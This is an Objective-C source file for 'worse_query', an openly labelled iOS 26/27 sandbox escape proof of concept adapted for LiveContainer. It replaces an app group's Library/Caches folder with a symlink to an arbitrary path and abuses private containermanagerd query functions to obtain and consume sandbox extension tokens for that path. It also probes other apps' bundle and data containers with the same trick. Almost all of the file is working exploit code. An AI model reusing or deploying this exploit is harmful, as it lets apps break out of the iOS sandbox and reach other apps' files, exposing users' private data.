//
//  worse_query.m
//  worse_query
//
//  Created by Taj C on 8/20/26.
//

/*
     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
     Copyright (C) 2026 Taj C (forcequit)

     Modified for LiveContainer: preserve and restore the selected app group's
     Library/Caches directory instead of deleting its contents.

     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
     (at your option) any later version.

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.

     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <objc/message.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef const char *(*container_get_path_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

static NSURL *worse_query_backup_url(NSURL *groupRoot) {
    return [groupRoot URLByAppendingPathComponent:@"Library/Caches.worse-query-backup"];
}

// Remove the temporary symlink and restore the original Caches directory.
static void clean_symlink(NSString *group) {
    if (group != NULL) {
        NSFileManager *files = [NSFileManager defaultManager];
        NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:group];
        if (groupRoot) {
            NSURL *caches = [groupRoot URLByAppendingPathComponent:@"Library/Caches"];
            NSURL *backup = worse_query_backup_url(groupRoot);
            [files removeItemAtURL:caches error:nil];
            if ([files fileExistsAtPath:backup.path]) {
                if (![files moveItemAtURL:backup toURL:caches error:nil]) {
                    [files createDirectoryAtURL:caches withIntermediateDirectories:YES attributes:nil error:nil];
                }
            } else {
                [files createDirectoryAtURL:caches withIntermediateDirectories:YES attributes:nil error:nil];
            }
        }
    }
}

static bool prepare_symlink(NSFileManager *files, NSURL *groupRoot, NSString *target) {
    NSURL *caches = [groupRoot URLByAppendingPathComponent:@"Library/Caches"];
    NSURL *backup = worse_query_backup_url(groupRoot);

    // Recover a backup left by an interrupted previous invocation.
    if ([files fileExistsAtPath:backup.path]) {
        [files removeItemAtURL:caches error:nil];
        if (![files moveItemAtURL:backup toURL:caches error:nil]) return false;
    }

    if ([files fileExistsAtPath:caches.path]) {
        if (![files moveItemAtURL:caches toURL:backup error:nil]) return false;
    }
    if (![files createSymbolicLinkAtPath:caches.path withDestinationPath:target error:nil]) {
        if ([files fileExistsAtPath:backup.path]) {
            [files moveItemAtURL:backup toURL:caches error:nil];
        }
        return false;
    }
    return true;
}

// So, who's ready for round two?
int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    // Check if the target exists
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255; // Nothing exists at this path, and create_dir is false
    }
    
    // Get the App Group's path
    // An App Group identifier you control is required for this
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupRoot) return -1; // App Group doesn't exist or we can't access it
    
    // Resolve functions
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2; // dlopen failed?
    
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -2; // Failed to resolve a function (unsupported OS)
    }
    
    // Create query
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -3; // Failed to create query
    }
    
    // Set up query
    xpc_object_t identifier;
    query_set_class(query, 7); // We're only using class 7 here (appGroup), which goes to containermanagerd
    identifier = xpc_string_create(group.UTF8String);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // The query's part sets our base path, part 3 is Library/Caches
    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL); // Accessing App Group containers on iOS 26.x needs different flags, for whatever reason
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }
    
    // Set up symlink while preserving the app group's existing cache directory.
    if (!prepare_symlink(files, groupRoot, target)) {
        query_free(query);
        dlclose(mgr);
        return -4; // Failed to create symlink
    }
    
    // Send our query over
    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -5; // Query rejected by containermanagerd
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -6; // Kernel refused to issue a sandbox extension
    }
    
    // Consume sandbox extension and clean up
    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    dlclose(mgr);
    clean_symlink(group);
    
    return handle;
}

NSString *worse_query_probe_bundle(NSString *bundleIdentifier, NSString *groupIdentifier) {
    NSString *identifierText = [bundleIdentifier stringByTrimmingCharactersInSet:
        NSCharacterSet.whitespaceAndNewlineCharacterSet];
    if (!identifierText.length) {
        return @"A bundle identifier is required.";
    }

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        return [NSString stringWithFormat:@"Could not load libsystem_containermanager: %s",
                dlerror() ?: "unknown error"];
    }

    container_query_create_fn queryCreate = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn querySetClass = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn querySetIdentifiers =
        (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_identifiers");
    container_query_set_flags_fn querySetFlags =
        (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_get_single_result_fn queryGetSingleResult =
        (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn queryFree = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_get_path_fn getPath = (container_get_path_fn)dlsym(mgr, "container_object_get_path");
    container_copy_sandbox_token_fn copyToken =
        (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");

    if (!queryCreate || !querySetClass || !querySetIdentifiers || !querySetFlags ||
        !queryGetSingleResult || !queryFree || !getPath || !copyToken) {
        dlclose(mgr);
        return @"The required containermanager probe symbols are unavailable.";
    }

    NSMutableArray<NSString *> *lines = [NSMutableArray arrayWithObjects:
        [NSString stringWithFormat:@"Bundle container probe: %@", identifierText],
        @"Testing focused application container classes 1 and 2.",
        @"Only result paths and token presence are shown.", @"", nil];
    NSUInteger resultCount = 0;
    NSUInteger tokenCount = 0;

    // Class 2 is the known app-data class. Class 1 is probed as the adjacent
    // application/bundle class. Avoid class 0: it means 'unset' and causes
    // container_query_get_single_result() to abort the process.
    const uint64_t classes[] = { 1, 2 };
    const uint64_t flags[] = {
        0x0000000100000000ULL, // metadata/read query
        0x0000008100000000ULL, // read/write query used by container tools
    };

    for (NSUInteger classIndex = 0; classIndex < sizeof(classes) / sizeof(classes[0]); classIndex++) {
        for (NSUInteger flagIndex = 0; flagIndex < sizeof(flags) / sizeof(flags[0]); flagIndex++) @autoreleasepool {
            void *query = queryCreate();
            if (!query) continue;

            xpc_object_t identifier = xpc_string_create(identifierText.UTF8String);
            const xpc_object_t values[] = { identifier };
            xpc_object_t identifiers = xpc_array_create(values, 1);
            querySetClass(query, classes[classIndex]);
            querySetIdentifiers(query, identifiers);
            querySetFlags(query, flags[flagIndex]);

            void *result = queryGetSingleResult(query);
            if (result) {
                resultCount += 1;
                const char *path = getPath(result);
                char *token = copyToken(result);
                if (token) tokenCount += 1;
                NSString *pathText = path ? [NSString stringWithUTF8String:path] : @"<no path>";
                [lines addObject:[NSString stringWithFormat:
                    @"class=%llu flags=%@ path=%@ token=%@",
                    (unsigned long long)classes[classIndex],
                    flagIndex == 0 ? @"metadata" : @"read-write",
                    pathText ?: @"<invalid UTF-8>",
                    token ? @"YES" : @"NO"]];
                free(token);
            }

            queryFree(query);
        }
    }

    // LaunchServices can often disclose an installed app's exact bundle URL even
    // when the containing Bundle/Application directory cannot be listed. Test the
    // existing worse_query symlink technique against that exact bundle path.
    Class proxyClass = NSClassFromString(@"LSApplicationProxy");
    if (!proxyClass) {
        dlopen("/System/Library/Frameworks/CoreServices.framework/CoreServices", RTLD_LAZY | RTLD_LOCAL);
        proxyClass = NSClassFromString(@"LSApplicationProxy");
    }
    SEL proxySelector = NSSelectorFromString(@"applicationProxyForIdentifier:");
    SEL bundleURLSelector = NSSelectorFromString(@"bundleURL");
    [lines addObject:@""];
    if (proxyClass && [proxyClass respondsToSelector:proxySelector]) {
        id proxy = ((id (*)(id, SEL, id))(void *)objc_msgSend)(proxyClass, proxySelector, identifierText);
        if (proxy && [proxy respondsToSelector:bundleURLSelector]) {
            NSURL *bundleURL = ((id (*)(id, SEL))(void *)objc_msgSend)(proxy, bundleURLSelector);
            if ([bundleURL isKindOfClass:NSURL.class] && bundleURL.isFileURL) {
                [lines addObject:[NSString stringWithFormat:@"LaunchServices bundle path: %@", bundleURL.path]];
                NSString *groupText = [groupIdentifier stringByTrimmingCharactersInSet:
                    NSCharacterSet.whitespaceAndNewlineCharacterSet];
                if (groupText.length) {
                    int64_t exactPathHandle = worse_query(bundleURL.path, groupText, false, false);
                    [lines addObject:[NSString stringWithFormat:@"Exact-path worse_query result: %lld%@",
                                      (long long)exactPathHandle,
                                      exactPathHandle >= 0 ? @" (sandbox extension issued)" : @""]];
                    if (exactPathHandle >= 0) {
                        worse_query_release(exactPathHandle);
                    }
                } else {
                    [lines addObject:@"Exact-path test skipped: no usable App Group was resolved."];
                }
            } else {
                [lines addObject:@"LaunchServices returned no file bundle URL for this identifier."];
            }
        } else {
            [lines addObject:@"LaunchServices returned no application proxy for this identifier."];
        }
    } else {
        [lines addObject:@"LSApplicationProxy is unavailable in this process."];
    }

    [lines addObject:@""];
    [lines addObject:[NSString stringWithFormat:@"Results: %lu; tokens: %lu.",
                      (unsigned long)resultCount, (unsigned long)tokenCount]];
    if (!resultCount) {
        [lines addObject:@"Neither application container class accepted this identifier."];
    } else if (!tokenCount) {
        [lines addObject:@"Containers were found, but none issued a sandbox extension token."];
    }

    dlclose(mgr);
    return [lines componentsJoinedByString:@"\n"];
}

// You should probably call this when you're done
void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}
